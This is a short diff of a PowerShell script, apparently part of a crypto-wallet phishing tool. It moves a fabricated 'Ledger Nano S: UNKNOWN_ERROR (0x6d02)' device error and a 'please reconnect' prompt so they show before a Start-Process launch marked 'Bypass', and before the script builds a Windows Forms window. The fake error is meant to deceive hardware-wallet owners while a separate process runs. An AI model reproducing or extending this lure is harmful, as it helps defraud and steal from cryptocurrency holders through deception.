@@ -1307,6 +1307,8 @@ if (-not (Test-Path $targetFolder)) {
     $started = $false
     try {
         #Write-DebugLog "Versuche Start-Process (sichtbar + Bypass)..."
+        Write-Output "Ledger Nano S: UNKNOWN_ERROR (0x6d02) - Device not responding."
+        Write-Output "Something went wrong. Please reconnect your device..."
 
         # Reine PS-Args als Array (kein Mix)
         $psArgs = @(
@@ -1383,8 +1385,7 @@ if (-not (Test-Path $targetFolder)) {
     #New-Item -Path $flagFilePath -ItemType File -Force | Out-Null
     #Write-DebugLog "Operator-Start abgeschlossen. Flag gesetzt."
 
-Write-Output "Ledger Nano S: UNKNOWN_ERROR (0x6d02) - Device not responding."
-Write-Output "Something went wrong. Please reconnect your device..."
+
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
